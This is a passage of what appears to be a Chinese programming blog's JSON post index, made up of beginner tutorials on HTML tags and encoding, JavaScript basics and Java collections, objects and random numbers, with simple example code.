&lt;标签名 /&gt; 元素: 元素和标签都是等价的,说白了元素就是标签… 但我们也可以理解成一个完整的标签称为元素. 如上面的结构所述的就是完整的标签 例如:&lt;h1&gt;我是一个完整的元素&lt;/h1&gt; 属性: 可以为HTML标签设置属性 通过属性为HTML元素提供附加信息 属性需要设置在开始标签或自结束标签中 属性总是以名称/值对的形式出现的 比如:name =&quot;value&quot; &lt;img src=&quot;&quot; alt=&quot;&quot; /&gt; 标题标签 在HTML中一共有6级标题标签 h1~h6,其中h1最大,h6最小 使用html标签时,关心的是标签的语义,我们使用的标签都是语义化标签. 6级标题中,h1的最重要,h1的重要性仅次于title,搜索引擎检索完title之后,会立即查看h1中的内容 h1标签非常重要,他会影响到页面在搜索引擎中的排名,页面只能写一个h1 一般页面中标题标签只使用h1~h3标题标签,h3以后的基本不使用 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;我是1级标签&lt;/h1&gt; &lt;h2&gt;我是2级标签&lt;/h2&gt; &lt;h3&gt;我是3级标签&lt;/h3&gt; &lt;h4&gt;我是4级标签&lt;/h4&gt; &lt;h5&gt;我是5级标签&lt;/h5&gt; &lt;h6&gt;我是6级标签&lt;/h6&gt; &lt;/body&gt;&lt;/html&gt; 段落标签 段落标签,段落标签用于表示内容中的一个自然段 使用p标签来表示一个段落 p标签中的文字,默认会独占一行,并且段与段之间会有一个间距 &lt;p&gt;我是一个段落标签,用来表示一个自然段.&lt;/p&gt; 在HTML中,字符之间写再多的空格,浏览器也会当成一个空格解析,换行也会当成一个空格解析 &lt;br&gt;换行标签 在页面中使用br标签来表示一个换行,br标签是一个自结束标签. &lt;br /&gt; &lt;hr&gt;水平标签 hr也是一个自结束标签,可以在页面中生成一条水平线. &lt;hr /&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"乱码问题","slug":"html-css00005乱码问题","date":"2020-02-14T13:08:01.000Z","updated":"2020-02-14T13:26:46.712Z","comments":true,"path":"2020/02/14/html-css00005乱码问题/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/html-css00005乱码问题/","excerpt":"","text":"乱码问题 编码: 依据一定的规则,将字符转换为二进制编码的过程称之为编码. 解码: 依据一定的规则,将二进制编码转换为字符的过程称之为解码. 字符集: 编码和解码所采用的规则,我们称之为字符集 常见字符集: 1.ASCII 2.ISO-8859-1 3.GBK 4.GB2312 中文系统默认编码 5.UTF-8 万国码,支持地球上所有的文字 乱码原因: 产生乱码的根本原因是,编码和解码所采用的字符集不同 在中文系统的浏览器中,默认都是使用GB2312进行解码的 解决: 用&lt;meta charset=&quot;字符集&quot; /&gt;标签告诉浏览器网页所采用的编码字符集 meta标签用来设置网页的一些元数据,比如网页的字符集,关键字,简介等… meta是一个自结束标签,编写一个自结束标签时,可以在开始标签中添加一个 / ANSI ANSI代表智能字符集,会跟随操作系统默认选择的字符集 例如中文操作系统默认的字符集是GB2312 12345678910&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;!--告诉浏览器,使用UTF-8进行解码 --&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"JS文档声明","slug":"html-css00004文档声明","date":"2020-02-14T12:17:28.000Z","updated":"2020-02-14T13:07:30.471Z","comments":true,"path":"2020/02/14/html-css00004文档声明/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/html-css00004文档声明/","excerpt":"","text":"JS文档声明 我们需要告诉浏览器我们编写的html是使用哪个版本的 HTML5版本的文档声明很简单,只需要在顶部添加&lt;!DOCTYPE html&gt;既可. 注意事项 如果不添加文档声明,则会导致有些浏览器会进入一个怪异模式,进入怪异模式以后,浏览器解析页面会导致页面无法正常显示,所以为了避免进入该模式,一定要写文档声明 12345678910&lt;!--我是文档声明--&gt;&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"Null和Undefined","slug":"JS00010Null和Undefined","date":"2020-02-14T01:22:09.000Z","updated":"2020-02-14T04:39:21.635Z","comments":true,"path":"2020/02/14/JS00010Null和Undefined/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00010Null和Undefined/","excerpt":"","text":"Null和Undefined Null(空值)类型只有一个值,就是null null这个值专门用来表示一个为空的对象 使用typeof检查一个null值时,会返回object Undefined(未定义)类型的值只有一个,就Undefined 当声明一个变量,但未初始化时,他的值就是Undefined 使用typeof检查一个Undefined值时,也会返回一个undefined 123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script&gt; //定义一个空类型变量,和一个Undefined变量 var a = null; var b; console.log(a); // 输出object console.log(b); // 输出undefined //输出object console.log(typeof a); //输出 undefined console.log(typeof b); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[{"name":"Null和Undefined","slug":"Null和Undefined","permalink":"https://xiaowuyoucy.github.io/tags/Null和Undefined/"}]},{"title":"JS_Boolean类型","slug":"JS00009-Boolean值类型","date":"2020-02-14T01:12:57.000Z","updated":"2020-02-14T04:39:14.528Z","comments":true,"path":"2020/02/14/JS00009-Boolean值类型/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00009-Boolean值类型/","excerpt":"","text":"JS_Boolean类型 Boolean布尔值 布尔值有两个,主要用来做逻辑判断 true 表示真 false 表示假 使用typeof检查一个布尔值时,会返回一个boolean 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script&gt; var isBingo = false; console.log(typeof false); console.log(typeof true); console.log(isBingo); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS_Number类型","slug":"JS00008-Number类型","date":"2020-02-14T00:29:49.000Z","updated":"2020-02-14T04:39:08.846Z","comments":true,"path":"2020/02/14/JS00008-Number类型/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00008-Number类型/","excerpt":"","text":"JS_Number类型 基本概念及使用 在JS中所有的数值都是Number类型,包括整数和浮点数 可以使用一个运算符typeof来检查变量类型,使用格式typeof 变量名会返回一个变量类型的字符串 JS中可以表示的数值的最大值是:Number.MAX_VALUE JS中可以表示大于0的最小值Number.MIN_VALUE 如果使用Number类型的变量超过了Number.MAX_VALUE则会返回一个Infinity,表示正无穷. Infinity表示正无穷 -Infinity表示符无穷 使用typeof检查Infinity也会返回Number NaN是一个特殊的数字,表示Not A Number 用typeof检查NaN时也会返回number 精度: 在JS中整数的基本运算可以保证精确的. 如果使用JS进行浮点运算,可能会得到一个不精确的结果 所以不要使用JS进行对精确度要求比较高的运算 123456789101112131415161718192021222324252627282930313233343536373839&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script&gt; //声明一个整型变量和浮点型变量 var intNumber = 100; var floatNumber = 1.23; //在控制台输出两个变量的值 console.log(intNumber); console.log(floatNumber); //在控制台输出两个变量的类型 console.log(typeof intNumber); console.log(typeof floatNumber); //在控制台输出最大数值和&gt;0的最大数值 console.log(Number.MAX_VALUE); console.log(Number.MIN_VALUE); //超过最大值会返回一个Infinity var a = Number.MAX_VALUE; console.log(a * a); console.log(Number.MIN_VALUE * 1 / 2); //Infinity也是属于Number类型 console.log(typeof Infinity); //会返回一个NaN,表示不是一个数字 console.log(\"basd\" * \"abad\"); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS字符串","slug":"JS00007字符串","date":"2020-02-13T23:57:44.000Z","updated":"2020-02-14T04:39:04.728Z","comments":true,"path":"2020/02/14/JS00007字符串/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00007字符串/","excerpt":"","text":"JS字符串数据 数据类型: 在JS中一共有六种数据类型 String: 字符串类型 Number: 数值类型 Boolean: 布尔类型 Null: 空值 Undefined: 未定义 Object: 对象类型 其中String,Number,Boolean,Null,Undefined属于基本数据类型 而Object属于引用数据类型. String字符串 在JS中字符串需要使用引号引起来,例如&quot;abc&quot; 使用双引号和单引号都可以,但是不能混用,例如&quot; abc ' 这样是错误的. 引号不能嵌套,双引号不能放在双引号中,单引号也不能放在单引号中 在字符串中我们可以使用\\作为转义字符. 输出两个双引号可以用两个单引号引起来:' &quot;abc&quot; ' 当表示一些特殊字符时可以使用\\进行转义,例如: \\n 表示换行符 \\t 表示一个制表符 \\\\ 表示\\ \\’ 表示’ \\&quot; 表示&quot; 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script&gt; //声明字符串变量 var str = \"abcd\"; //使用用单引号输出双引号 var str1 = '\"1234\"'; //使用转义字符 var str2 = \"\\'qqqqqqq\\'\"; console.log(str); console.log(typeof str); console.log(str1) console.log(typeof str1); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS标识符","slug":"JS00006标识符","date":"2020-02-13T23:44:01.000Z","updated":"2020-02-14T04:38:59.770Z","comments":true,"path":"2020/02/14/JS00006标识符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00006标识符/","excerpt":"","text":"JS标识符 标识符 在JS中所有可以由我们自主命名的都可以称为是标识符. 例如:变量名,函数名,属性名等都属于标识符. 命名一个标识符时需要遵守如下规则: 1.标识符中可以含有字母,数字,下划线_,$ 2.标识符不能以数字开头. 3.标识符不能是ES中的关键字或保留字 4.标识符一般都采用小驼峰式法 -开头首字母小写,往后每个单词的首字母都是大写,其余的都是小写,例如helloWorld -JS底层保存标识符时实际上是采用Unicode的编码,也就是说标识符可以用中文,但不建议这样做.","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS字面常量和变量","slug":"JS00005字面常量和变量","date":"2020-02-13T23:32:00.000Z","updated":"2020-02-14T04:38:55.168Z","comments":true,"path":"2020/02/14/JS00005字面常量和变量/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00005字面常量和变量/","excerpt":"","text":"JS字面常量和变量 字面常量: 字面常量 都是一些不能改变的值,例如1,2,3,4; 字面常量都是可以直接使用的,但是我们一般不会直接使用; 变量: 变量可以用来保存字面量,而且变量的值是可以任意改变的. 变量在JS中使用var关键字来声明一个变量; 变量声明格式:var 变量名 = 初始值; 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script&gt; //声明一个变量 var a; //声明一个变量,并赋初始值 var age = 11; var height = 168.8; //对变量进行修改 age = 14; console.log(age); console.log(height); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS基本语法","slug":"JS00004基本语法","date":"2020-02-13T23:07:44.000Z","updated":"2020-02-14T04:38:50.703Z","comments":true,"path":"2020/02/14/JS00004基本语法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00004基本语法/","excerpt":"","text":"JS基本语法 JS注释 多行注释: 用 /* */ 单行注释: 用 // 注意 1.JS中严格区分大小写 2.JS中每一条语句以分号（ ；）结尾 如果不写分号,浏览器会自动添加,但是会消耗一些系统资源,而且有些时候,浏览器会加错分号,所以在开发中分号必须要写 3.JS中会忽略多个空格和换行，所以我们可以利用空格和换行对代码进行格式化。 12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script&gt; //年龄 var age = 11; //身高 var height = 168.8; //在控制台上输出年龄 console.log(age); /* 在控制台上输出身高*/ console.log(height); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JavaScript的编写位置","slug":"JS00003JavaScript的编写位置","date":"2020-02-13T16:32:04.000Z","updated":"2020-02-14T04:38:46.177Z","comments":true,"path":"2020/02/14/JS00003JavaScript的编写位置/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00003JavaScript的编写位置/","excerpt":"","text":"JavaScript的编写位置 可以将js代码写在button标签中的onclick属性中 &lt;button onclick=&quot;alert('我爱你');&quot; &gt;点我一下&lt;/button&gt; 可以将js代码写在超链接的href属性中,这样当点击超链接时,就会执行js代码. &lt;a href=&quot;javascript:alert('我太爱你了');&quot;&gt;1234&lt;/a&gt; &lt;a href=&quot;javascript:;&quot;&gt;1234&lt;/a&gt; 可以将js代码写到script标签 ( 推荐使用的方式 ) 123&lt;script type=\"text/javascript\"&gt;/*代码块*/&lt;/script&gt; 可以将js 代码编写到外部js文件中,然后通过script标签引入 外部文件后缀名以.js结尾 js代码写到外部文件中可以在不同的页面中同时引用,也可以利用浏览器的缓存机制. 注意: &lt;Script&gt;标签一旦用于引入外部文件了,就不能再编写代码在标签内部了,即使编写了浏览器也会忽略 如果需要插入其他js代码,则可以再创建一个新的script标签用于编写内部代码 123&lt;script type=\"text/javascript\" src=\"demo001.js\"&gt; &lt;/script&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"第一个JavaScript程序","slug":"JS00002第一个JavaScript程序","date":"2020-02-13T14:43:38.000Z","updated":"2020-02-14T04:38:37.197Z","comments":true,"path":"2020/02/13/JS00002第一个JavaScript程序/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/JS00002第一个JavaScript程序/","excerpt":"","text":"第一个JavaScript程序 JavaScript程序以&lt;script&gt;开头,并以&lt;/script&gt;结尾 &lt;script type=&quot;text/javascript&quot;&gt;等价于&lt;script&gt; 弹出一个警告框:用alert(&quot;内容&quot;);函数 在文本写内容用:document.write(&quot;内容&quot;); 在控制台显示内容用: console.log(&quot;内容&quot;); 1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html lang=\"zh\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\" /&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\" /&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script&gt; alert(\"我爱你\"); document.write(\"我爱你\"); console.log(\"get out!\"); &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JavaScript基础","slug":"JS00001JavaScript基础","date":"2020-02-13T12:57:22.000Z","updated":"2020-02-14T04:41:12.482Z","comments":true,"path":"2020/02/13/JS00001JavaScript基础/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/JS00001JavaScript基础/","excerpt":"","text":"JavaScript基础 起源 JavaScript诞生于1995年,它的出现主要用于处理网页中的前端验证. 所谓的前端验证,就是指检查用户输入的内容是否符合一定的规则. 比如:用户名的长度,密码的长度,邮箱的格式等. 简史 JavaScript是由网景公司发明的,起初命名为LiveScrip,后来由SUN公司的介入更名为了JavaScript. 1996年微软公司在其最新的IE3浏览器中引入了自己对JavaScript的实现JScript. 于是在市面上存在两个版本的JavaScript,一个网景公司的JavaScript和微软的JScript. 为了确保不同的浏览器上运行的JavaScript标准一致,所以几个公司共同定制了JS的标准名命名为ECMAScript. 实现 ECMAScript是一个标准,而这个标准需要由各个厂商去实现. 不同的浏览器厂商对该标准会有不同的实现. 浏览器 JavaScript实现方式 Firefox SpiderMonkey Internet Explorer JScript/Chakra Safari JavaScriptCore Chrome v8 Carakan Carakan 学习JavaScript就是学习三个部分: ECMAScript DOM BOM","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"ArrayList集合的常用方法和遍历","slug":"java00048ArrayList集合的常用方法和遍历","date":"2020-02-13T08:08:58.000Z","updated":"2020-02-13T08:25:48.734Z","comments":true,"path":"2020/02/13/java00048ArrayList集合的常用方法和遍历/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/java00048ArrayList集合的常用方法和遍历/","excerpt":"","text":"ArrayList集合的常用方法和遍历 public boolean add(E)方法:向集合中添加一个元素 public E remove(int index)方法:在集合中移除一个元素 public E get(int index)方法:获取指定的集合元素 public int size()方法:获取集合的长度 索引从0开始 小技巧: 输入对象数组名.fori再按下tab键,会自动生成一个 1234for(int i = 0 ;i &lt; 对象名.size();i++)&#123;&#125; 123456789101112131415161718192021222324252627import java.util.ArrayList;public class Main14&#123; public static void main(String[] args) &#123; ArrayList&lt;Dog&gt; dog = new ArrayList&lt;&gt;(); //向dog集合添加元素 dog.add(new Dog(\"小黑\",1,\"黑色\")); dog.add(new Dog(\"小黄\",2,\"黄色\")); dog.add(new Dog(\"小白\",3,\"白色\")); dog.add(new Dog(\"小pi\",4,\"黑白色\")); printAll(dog); //移除dog集合中的第2号元素,索引从0开始; dog.remove(2); printAll(dog); &#125; public static void printAll(ArrayList&lt;Dog&gt; dog) &#123; //获取dog集合的长度 for (int i = 0; i &lt; dog.size(); i++) &#123; //获取dog集合中指定第i个元素,从索引0开始 dog.get(i).printAll(); System.out.println(\"============================================\"); &#125; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public class Dog&#123; private String name;//姓名 private int age;//年龄 private String color;//毛色 public Dog(String name, int age, String color) &#123; this.name = name; this.age = age; this.color = color; &#125; public Dog() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public String getColor() &#123; return color; &#125; public void setColor(String color) &#123; this.color = color; &#125; public void printAll() &#123; System.out.println(\"名字: \" + name); System.out.println(\"年龄 \" + age); System.out.println(\"毛色: \" + color); &#125; //打印所有成员变量&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"ArrayList集合概述和基本使用","slug":"java00047ArrayList集合概述和基本使用","date":"2020-02-13T07:54:03.000Z","updated":"2020-02-13T08:06:57.084Z","comments":true,"path":"2020/02/13/java00047ArrayList集合概述和基本使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/java00047ArrayList集合概述和基本使用/","excerpt":"","text":"ArrayList集合概述和基本使用 ArrayList集合的长度是可以变化的 在java.util包中 ArrayList有一个尖括号&lt;E&gt;,代表泛型; 泛型也就是代表集合中每一个元素中的类型统一化 ,其中的E要替换为引用类型 注意: 泛型只能是引用类型,不能是基本类型. 在ArrayList类中直接打印对象名字显示的不是地址,而是内容 12345678910111213141516import java.util.ArrayList;public class Main13&#123; public static void main(String[] args) &#123; // ArrayList&lt;String&gt;代表strList集合中的元素全部都是String类型 //new ArrayList&lt;String&gt;() 等价于 new ArrayList&lt;&gt;() //从java1.7开始,右侧的尖括号中的内容可以不写,但是&lt;&gt;本身不能省略 ArrayList&lt;String&gt; strList = new ArrayList&lt;&gt;(); System.out.println(strList);//[] strList.add(\"张无忌\"); strList.add(\"张三丰\"); //直接打印对象名 System.out.println(strList);//[\"张无忌\",\"张三丰\"] &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"对象数组","slug":"java00046对象数组","date":"2020-02-13T07:41:16.000Z","updated":"2020-02-13T07:52:54.312Z","comments":true,"path":"2020/02/13/java00046对象数组/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/java00046对象数组/","excerpt":"","text":"对象数组 对象数组的创建格式: 第一种方式: 类名[] 对象名 = new 类名[n];其中n代表数组的长度. 第二种方式: 类名[] 对象名 = {new 类名( [初始值] ) ,...,new 类名( [初始值] )} 注意事项: 创建了一个对象数组之后不能直接使用,因为还没有为数组分配对象. 第二种创建的对象数组可以直接使用,因为它一开始就给对象数组分配了对象 1234567891011121314151617181920212223public class Main12&#123; public static void main(String[] args) &#123; //创建对象数组,并对对象数组初始化 Dog[] dogArray = &#123;new Dog(),new Dog(),new Dog(),new Dog()&#125;; dogArray[0].setName(\"小黑\"); dogArray[0].setAge(1); dogArray[0].setColor(\"黑色\"); dogArray[1].setName(\"小白\"); dogArray[1].setAge(1); dogArray[1].setColor(\"白色\"); dogArray[2].setName(\"小黄\"); dogArray[2].setAge(1); dogArray[2].setColor(\"黄色\"); for (int i = 0; i &lt; dogArray.length; i++) &#123; dogArray[i].printAll(); System.out.println(\"=======================\"); &#125; &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445public class Dog&#123; private String name;//姓名 private int age;//年龄 private String color;//毛色 public Dog(String name, int age, String color) &#123; this.name = name; this.age = age; this.color = color; &#125; public Dog() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public String getColor() &#123; return color; &#125; public void setColor(String color) &#123; this.color = color; &#125; public void printAll() &#123; System.out.println(\"名字: \" + name); System.out.println(\"年龄 \" + age); System.out.println(\"毛色: \" + color); &#125; //打印所有成员变量&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java生成一个1-n的随机数","slug":"java00045生成一个1-n的随机数","date":"2020-02-13T02:02:25.000Z","updated":"2020-02-13T02:11:23.967Z","comments":true,"path":"2020/02/13/java00045生成一个1-n的随机数/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/java00045生成一个1-n的随机数/","excerpt":"","text":"生成一个1-n的随机数 思路: 1.定义一个int变量n,随意赋值. 2.要使用Random:三个步骤,导包,创建,使用 3.如果写10,那么就是0~9,然而想要的是1-10,可以发现:整体+1:rand.nextInt(n) + 1既可. 4.打印随机数字. 12345678910111213141516import java.util.Random;public class Main10&#123; public static void main(String[] args) &#123; int n = 5; //第一步 Random rand = new Random();//第二步 for (int i = 0; i &lt; 100; i++) &#123; int num = rand.nextInt(n) + 1; //第三步 System.out.println(num);//第四步 &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Random概述和基本使用","slug":"java00044Random概述和基本使用","date":"2020-02-13T01:36:07.000Z","updated":"2020-02-13T01:54:36.195Z","comments":true,"path":"2020/02/13/java00044Random概述和基本使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/java00044Random概述和基本使用/","excerpt":"","text":"Random概述和基本使用 Random类是用来生成随机数字的.使用起来也是三个步骤: 1.导包 import java.util.Random 2.创建 Random rand = new Random();一般括号留空即可 3.使用 获取一个随机int数字(范围是int所有范围,有正负两种) int num = rand.nextInt(); 获取一个指定范围的随机int数字(获取范围: [ 0 ,int ) 闭合区间 ) 打印范围是0 ~ (int -1) int num = rand.nextInt(int); 1234567891011121314import java.util.Random;public class Main09&#123; public static void main(String[] args) &#123; Random rand = new Random(); //范围是负的int最大值~正的int最大值 System.out.println(\"随机数是: \" + rand.nextInt()); for(int i = 0; i &lt; 100; i++) &#123; System.out.println(rand.nextInt(100)); // 打印范围是0~99 &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"匿名对象作为方法的参数及返回值","slug":"java00043匿名对象作为方法的参数及返回值","date":"2020-02-13T01:06:43.000Z","updated":"2020-02-13T01:21:31.332Z","comments":true,"path":"2020/02/13/java00043匿名对象作为方法的参数及返回值/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/java00043匿名对象作为方法的参数及返回值/","excerpt":"","text":"匿名对象作为方法的参数及返回值 快速生成局部变量的快捷键: 想快速生成一个 Dog dog = new Dog();的局部变量只需要输入new Dog(); 并按下ALT + Entter 1234567891011121314151617181920212223import java.util.Scanner;public class Main08&#123; public static void main(String[] args) &#123; scanInt(new Scanner(System.in)); Dog dog = reDog(\"小黑\", 1, \"黑色\"); System.out.println(\"=====================================\"); dog.printAll(); &#125; //使用匿名对象作为参数 public static void scanInt(Scanner sc)&#123; System.out.println(\"请输入一个数: \"); int num = sc.nextInt(); System.out.println(\"你输入的数是: \" + num); &#125; //使用匿名对象作为返回值 public static Dog reDog(String name,int age,String color)&#123; return new Dog(name,age,color); &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public class Dog&#123; private String name;//姓名 private int age;//年龄 private String color;//毛色 public Dog(String name, int age, String color) &#123; this.name = name; this.age = age; this.color = color; &#125; public Dog() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public String getColor() &#123; return color; &#125; public void setColor(String color) &#123; this.color = color; &#125; public void printAll() &#123; System.out.println(\"名字: \" + name); System.out.println(\"年龄 \" + age); System.out.println(\"毛色: \" + color); &#125; //打印所有成员变量&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"匿名对象的说明","slug":"java00042匿名对象的说明","date":"2020-02-13T00:52:33.000Z","updated":"2020-02-13T01:05:22.186Z","comments":true,"path":"2020/02/13/java00042匿名对象的说明/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/java00042匿名对象的说明/","excerpt":"","text":"匿名对象的说明 没有名称的对象称为匿名对象,格式: new 类名(); 可以直接使用匿名对象来调用类方法,格式: new 类名().方法名(); 注意事项: 匿名对象只能使用一次,下次继续使用需要从新new一个,原来那个会自动回收掉. 1234567891011121314151617import java.util.Scanner;public class Main07&#123; public static void main(String[] args) &#123; System.out.print(\"请输入一个数:\"); int num = new Scanner(System.in).nextInt();//我是匿名对象 new Dog(\"小黄\",1,\"黄色\").printAll();//我是匿名对象 System.out.println(\"==================================\"); new Dog(\"小黑\",2,\"黑白\").printAll();//我是匿名对象 &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public class Dog&#123; private String name;//姓名 private int age;//年龄 private String color;//毛色 public Dog(String name, int age, String color) &#123; this.name = name; this.age = age; this.color = color; &#125; public Dog() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public String getColor() &#123; return color; &#125; public void setColor(String color) &#123; this.color = color; &#125; public void printAll() &#123; System.out.println(\"名字: \" + name); System.out.println(\"年龄 \" + age); System.out.println(\"毛色: \" + color); &#125; //打印所有成员变量&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"标签的属性","slug":"html-css00003标签的属性","date":"2020-02-12T14:25:03.000Z","updated":"2020-02-12T14:32:41.990Z","comments":true,"path":"2020/02/12/html-css00003标签的属性/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/html-css00003标签的属性/","excerpt":"","text":"标签的属性 属性: 可以通过属性来设置标签如何处理标签中的内容 在开始标签中添加属性 属性需要写在开始标签中,实际上就是一个名值对的结构 属性名 = &quot;属性值&quot;,一个标签中可以同时设置多个属性,属性之间需要使用空格隔开 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;!-- 我是注释--&gt;&lt;body&gt; &lt;h1&gt; &lt;!--通过font标签中的color属性来改变字体颜色--&gt; &lt;font color=\"red\"&gt;第一个&lt;/font&gt;网站 